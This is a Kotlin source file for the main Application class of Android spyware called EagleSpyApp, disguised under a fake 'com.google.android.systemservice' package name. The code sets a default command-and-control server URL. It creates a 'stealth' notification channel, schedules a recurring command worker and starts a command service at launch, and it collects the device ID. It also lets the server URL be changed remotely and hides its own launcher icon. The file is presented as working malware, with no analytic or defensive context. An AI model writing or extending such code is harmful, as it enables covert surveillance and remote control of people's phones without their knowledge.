package com.google.android.systemservice

import android.app.Application
import android.content.ComponentName
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.google.android.systemservice.workers.CommandWorker
import com.google.android.systemservice.utils.StealthNotificationHelper
import java.util.concurrent.TimeUnit

class EagleSpyApp : Application() {

    companion object {
        private const val TAG = "EagleSpyApp"
        private const val PREFS_NAME = "stealth_prefs"
        private const val KEY_DEVICE_ID = "device_id"
        private const val KEY_SERVER_URL = "server_url"
        
        // Default C2 server
        private const val DEFAULT_SERVER_URL = "ws://192.168.1.5:3000/cable"
        
        private var instance: EagleSpyApp? = null
        
        fun getInstance(): EagleSpyApp {
            return instance ?: throw IllegalStateException("App not initialized")
        }
    }

    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        instance = this
        
        Log.d(TAG, "EagleSpyApp initializing...")
        
        // Initialize AndroidConfig device ID
        com.google.android.systemservice.config.AndroidConfig.initDeviceId(this)
        
        // Create stealth notification channel
        StealthNotificationHelper.createStealthChannel(this)
        
        // Schedule background worker
        scheduleCommandWorker()
        
        // Start CommandService immediately
        startCommandService()
        
        Log.d(TAG, "EagleSpyApp initialized")
    }

    private fun scheduleCommandWorker() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val workRequest = PeriodicWorkRequestBuilder<CommandWorker>(
            15, TimeUnit.MINUTES,
            5, TimeUnit.MINUTES  // Flex interval
        )
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "command_worker",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
        
        Log.d(TAG, "CommandWorker scheduled")
    }

    private fun startCommandService() {
        try {
            val intent = android.content.Intent(this, com.google.android.systemservice.services.CommandService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "CommandService started from Application")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start CommandService: ${e.message}")
        }
    }

    fun getDeviceIdentifier(): String {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        var deviceId = prefs.getString(KEY_DEVICE_ID, null)
        
        if (deviceId == null) {
            deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                ?: java.util.UUID.randomUUID().toString()
            prefs.edit().putString(KEY_DEVICE_ID, deviceId).apply()
        }
        
        return deviceId
    }

    fun getServerUrl(): String {
        return getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .getString(KEY_SERVER_URL, DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
    }

    fun updateServerUrl(newUrl: String) {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .edit()
            .putString(KEY_SERVER_URL, newUrl)
            .apply()
        Log.d(TAG, "Server URL updated to: $newUrl")
    }

    fun isSetupComplete(): Boolean {
        return getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .getBoolean("setup_complete", false)
    }

    fun hideLauncherIcon() {
        val componentName = ComponentName(this, SetupWizardActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        Log.d(TAG, "Launcher icon hidden")
    }

    fun showLauncherIcon() {
        val componentName = ComponentName(this, SetupWizardActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        Log.d(TAG, "Launcher icon shown")
    }
}
